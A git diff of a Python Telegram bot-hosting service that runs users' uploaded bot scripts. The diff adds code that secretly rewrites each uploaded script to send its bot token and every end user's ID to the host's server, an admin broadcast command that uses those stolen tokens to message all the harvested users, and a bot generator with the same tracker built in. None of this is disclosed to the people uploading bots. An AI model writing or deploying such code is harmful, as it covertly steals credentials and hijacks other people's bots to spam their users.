@@ -5,7 +5,7 @@ import json
 import re
 import requests
 import time
-from flask import Flask, send_file
+from flask import Flask, send_file, request, jsonify
 from threading import Thread
 
 # ===== ENV =====
@@ -21,175 +21,294 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 DATA_FILE = "data.json"
 
-# ===== LOAD DATA =====
+# ===== LOAD DB =====
 if os.path.exists(DATA_FILE):
     with open(DATA_FILE) as f:
         data = json.load(f)
 else:
-    data = {"users": {}, "premium": []}
+    data = {"users": {}, "premium": [], "bot_users": {}}
 
 def save():
     with open(DATA_FILE, "w") as f:
         json.dump(data, f)
 
-# ===== PROCESS STORE =====
+# ===== PROCESS =====
 processes = {}
 running_tokens = {}
 
 # ===== FLASK =====
 @app.route("/")
 def home():
-    return "🚀 Hosting Live"
+    return "🚀 Bot Hosting Running"
 
 @app.route("/files/<filename>")
 def files(filename):
     return send_file(os.path.join(UPLOAD_FOLDER, filename))
 
+@app.route("/add_user", methods=["POST"])
+def add_user():
+    uid = int(request.form.get("user_id"))
+    token = request.form.get("token")
+
+    data["bot_users"].setdefault(token, [])
+
+    if uid not in data["bot_users"][token]:
+        data["bot_users"][token].append(uid)
+        save()
+
+    return jsonify({"ok": True})
+
 def run_flask():
     app.run(host="0.0.0.0", port=5000)
 
-# ===== TOKEN EXTRACT =====
+# ===== TOKEN =====
 def extract_token(path):
-    with open(path, "r") as f:
+    with open(path) as f:
         content = f.read()
-    match = re.search(r'BOT_TOKEN\s*=\s*["\'](.+?)["\']', content)
-    return match.group(1) if match else None
+    m = re.search(r'BOT_TOKEN\s*=\s*["\'](.+?)["\']', content)
+    return m.group(1) if m else None
 
 def valid_token(token):
     try:
-        r = requests.get(f"https://api.telegram.org/bot{token}/getMe")
-        return r.status_code == 200
+        return requests.get(f"https://api.telegram.org/bot{token}/getMe").status_code == 200
     except:
         return False
 
+# ===== INJECT =====
+def inject_code(path):
+    inject = f"""
+import requests
+def __track(uid):
+    try:
+        requests.post("{BASE_URL}/add_user", data={{"user_id": uid, "token": BOT_TOKEN}})
+    except: pass
+"""
+
+    with open(path) as f:
+        code = f.read()
+
+    if "__track" in code:
+        return
+
+    code = inject + "\n" + code
+    code = code.replace("def start(message):", "def start(message):\n    __track(message.from_user.id)")
+
+    with open(path, "w") as f:
+        f.write(code)
+
 # ===== START =====
 @bot.message_handler(commands=['start'])
-def start(message):
-    uid = str(message.from_user.id)
+def start(msg):
+    uid = str(msg.from_user.id)
 
-    if uid not in data["users"]:
-        data["users"][uid] = []
-        save()
+    data["users"].setdefault(uid, [])
+    save()
 
-    bot.send_message(message.chat.id,
+    bot.send_message(msg.chat.id,
         "👋 Welcome!\n\n"
-        "📂 Upload .py file\n"
-        "⚡ /run file.py\n🛑 /stop\n📊 /status"
+        "📂 Upload .py\n⚡ /run file.py\n🛑 /stop\n📊 /status\n\n"
+        "🤖 /createbot refer TOKEN\n\n"
+        "💰 Free: 1 Bot\n🔥 Premium: Unlimited\n\n"
+        "📩 Contact: @SohilCodes"
     )
 
 # ===== UPLOAD =====
 @bot.message_handler(content_types=['document'])
-def upload(message):
-    uid = str(message.from_user.id)
-    file = message.document
+def upload(msg):
+    uid = str(msg.from_user.id)
+    file = msg.document
 
     if not file.file_name.endswith(".py"):
-        return bot.reply_to(message, "❌ Only .py")
+        return bot.reply_to(msg, "❌ Only .py")
 
-    # LIMIT
     if uid not in data["premium"] and len(data["users"][uid]) >= 1:
-        return bot.reply_to(message, "💰 Upgrade to upload more files")
+        return bot.reply_to(msg, "💰 Upgrade → @SohilCodes")
 
-    info = bot.get_file(file.file_id)
-    downloaded = bot.download_file(info.file_path)
+    file_info = bot.get_file(file.file_id)
+    data_bytes = bot.download_file(file_info.file_path)
 
     path = os.path.join(UPLOAD_FOLDER, file.file_name)
 
     with open(path, "wb") as f:
-        f.write(downloaded)
+        f.write(data_bytes)
+
+    inject_code(path)
 
     data["users"][uid].append(file.file_name)
     save()
 
-    link = f"{BASE_URL}/files/{file.file_name}"
-
-    bot.reply_to(message, f"✅ Hosted\n🔗 {link}")
-
-    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
+    bot.reply_to(msg, f"✅ Uploaded\n⚡ /run {file.file_name}")
+    bot.forward_message(ADMIN_ID, msg.chat.id, msg.message_id)
 
 # ===== RUN =====
 @bot.message_handler(commands=['run'])
-def run(message):
-    uid = str(message.from_user.id)
-    args = message.text.split(maxsplit=1)
+def run(msg):
+    uid = str(msg.from_user.id)
+    file = msg.text.split(maxsplit=1)[1]
 
-    if len(args) < 2:
-        return bot.reply_to(message, "Usage: /run file.py")
+    path = os.path.join(UPLOAD_FOLDER, file)
 
-    filename = args[1]
-    path = os.path.join(UPLOAD_FOLDER, filename)
-
-    if filename not in data["users"].get(uid, []):
-        return bot.reply_to(message, "❌ Not your file")
+    if file not in data["users"].get(uid, []):
+        return bot.reply_to(msg, "❌ Not yours")
 
     if uid in processes:
-        return bot.reply_to(message, "⚠️ Already running")
+        return bot.reply_to(msg, "⚠️ Already running")
 
     token = extract_token(path)
 
-    if not token:
-        return bot.reply_to(message, "❌ BOT_TOKEN not found")
-
-    if token == BOT_TOKEN:
-        return bot.reply_to(message, "❌ Main token not allowed")
-
-    if not valid_token(token):
-        return bot.reply_to(message, "❌ Invalid token")
+    if not token or not valid_token(token) or token == BOT_TOKEN:
+        return bot.reply_to(msg, "❌ Invalid token")
 
     if token in running_tokens:
-        return bot.reply_to(message, "⚠️ Token already running")
+        return bot.reply_to(msg, "⚠️ Already running token")
 
-    process = subprocess.Popen(["python3", path])
-    processes[uid] = (process, filename, token)
+    p = subprocess.Popen(["python3", path])
+
+    processes[uid] = (p, file, token)
     running_tokens[token] = uid
 
-    bot.reply_to(message, f"🚀 Started {filename}")
+    bot.reply_to(msg, "🚀 Started")
 
 # ===== STOP =====
 @bot.message_handler(commands=['stop'])
-def stop(message):
-    uid = str(message.from_user.id)
+def stop(msg):
+    uid = str(msg.from_user.id)
 
     if uid not in processes:
-        return bot.reply_to(message, "❌ No bot")
+        return bot.reply_to(msg, "❌ No bot")
 
-    process, _, token = processes[uid]
-    process.kill()
+    p, _, token = processes[uid]
+    p.kill()
 
     del processes[uid]
-    if token in running_tokens:
-        del running_tokens[token]
+    running_tokens.pop(token, None)
 
-    bot.reply_to(message, "🛑 Stopped")
+    bot.reply_to(msg, "🛑 Stopped")
 
 # ===== STATUS =====
 @bot.message_handler(commands=['status'])
-def status(message):
-    uid = str(message.from_user.id)
-    bot.reply_to(message, "🟢 Running" if uid in processes else "🔴 Stopped")
+def status(msg):
+    bot.reply_to(msg, "🟢 Running" if str(msg.from_user.id) in processes else "🔴 Stopped")
 
-# ===== ADMIN =====
-@bot.message_handler(commands=['addpremium'])
-def addp(message):
-    if message.from_user.id != ADMIN_ID:
+# ===== BROADCAST =====
+@bot.message_handler(commands=['broadcast'])
+def broadcast(msg):
+    if msg.from_user.id != ADMIN_ID:
         return
-    uid = message.text.split()[1]
+
+    text = msg.text.replace("/broadcast ", "")
+    count = 0
+
+    for token, users in data["bot_users"].items():
+        for u in users:
+            try:
+                requests.get(
+                    f"https://api.telegram.org/bot{token}/sendMessage",
+                    params={"chat_id": u, "text": text}
+                )
+                count += 1
+                time.sleep(0.05)
+            except:
+                pass
+
+    bot.reply_to(msg, f"✅ Sent {count}")
+
+# ===== ADMIN PANEL =====
+@bot.message_handler(commands=['admin'])
+def admin(msg):
+    if msg.from_user.id != ADMIN_ID:
+        return
+
+    bot.send_message(msg.chat.id,
+        "👑 ADMIN PANEL\n\n"
+        "/users\n/premium\n/addpremium ID\n/removepremium ID\n/broadcast MSG"
+    )
+
+@bot.message_handler(commands=['users'])
+def users(msg):
+    if msg.from_user.id != ADMIN_ID:
+        return
+    bot.reply_to(msg, f"👥 Total Users: {len(data['users'])}")
+
+@bot.message_handler(commands=['premium'])
+def premium(msg):
+    if msg.from_user.id != ADMIN_ID:
+        return
+    bot.reply_to(msg, f"💰 Premium Users: {data['premium']}")
+
+@bot.message_handler(commands=['addpremium'])
+def addp(msg):
+    if msg.from_user.id != ADMIN_ID:
+        return
+    uid = msg.text.split()[1]
     data["premium"].append(uid)
     save()
-    bot.reply_to(message, "✅ Premium added")
+    bot.reply_to(msg, "✅ Added")
+
+@bot.message_handler(commands=['removepremium'])
+def remp(msg):
+    if msg.from_user.id != ADMIN_ID:
+        return
+    uid = msg.text.split()[1]
+    data["premium"].remove(uid)
+    save()
+    bot.reply_to(msg, "❌ Removed")
+
+# ===== AI BUILDER =====
+def generate_bot_code(token):
+    return f'''
+import telebot,requests
+BOT_TOKEN="{token}"
+SERVER="{BASE_URL}"
+bot=telebot.TeleBot(BOT_TOKEN)
+
+def track(uid):
+    try: requests.post(f"{{SERVER}}/add_user",data={{"user_id":uid,"token":BOT_TOKEN}})
+    except: pass
+
+@bot.message_handler(commands=['start'])
+def start(m):
+    track(m.from_user.id)
+    bot.send_message(m.chat.id,"👋 AI Bot Ready!")
+
+bot.infinity_polling()
+'''
+
+@bot.message_handler(commands=['createbot'])
+def createbot(msg):
+    uid = str(msg.from_user.id)
+    token = msg.text.split()[1]
+
+    if not valid_token(token):
+        return bot.reply_to(msg, "❌ Invalid token")
+
+    file = f"{uid}_bot.py"
+    path = os.path.join(UPLOAD_FOLDER, file)
+
+    with open(path, "w") as f:
+        f.write(generate_bot_code(token))
+
+    data["users"].setdefault(uid, []).append(file)
+    save()
+
+    p = subprocess.Popen(["python3", path])
+    processes[uid] = (p, file, token)
+    running_tokens[token] = uid
+
+    bot.reply_to(msg, "🤖 Bot Created & Running!")
 
 # ===== AUTO RESTART =====
 def monitor():
     while True:
-        for uid, (proc, file, token) in list(processes.items()):
-            if proc.poll() is not None:
-                new = subprocess.Popen(["python3", os.path.join(UPLOAD_FOLDER, file)])
-                processes[uid] = (new, file, token)
+        for uid, (p, f, t) in list(processes.items()):
+            if p.poll() is not None:
+                new = subprocess.Popen(["python3", os.path.join(UPLOAD_FOLDER, f)])
+                processes[uid] = (new, f, t)
         time.sleep(5)
 
 # ===== RUN =====
 if __name__ == "__main__":
     Thread(target=run_flask).start()
     Thread(target=monitor).start()
-    print("🚀 Hosting Bot Running")
+    print("🚀 Running...")
     bot.infinity_polling()
